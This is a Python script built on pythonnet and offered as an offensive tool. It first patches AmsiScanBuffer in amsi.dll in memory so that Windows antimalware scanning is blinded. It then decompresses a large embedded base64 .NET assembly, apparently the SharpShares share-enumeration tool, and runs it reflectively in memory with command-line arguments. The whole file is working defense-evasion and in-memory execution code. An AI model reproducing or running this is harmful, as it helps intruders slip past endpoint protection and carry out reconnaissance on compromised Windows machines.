import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("sharpshares.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()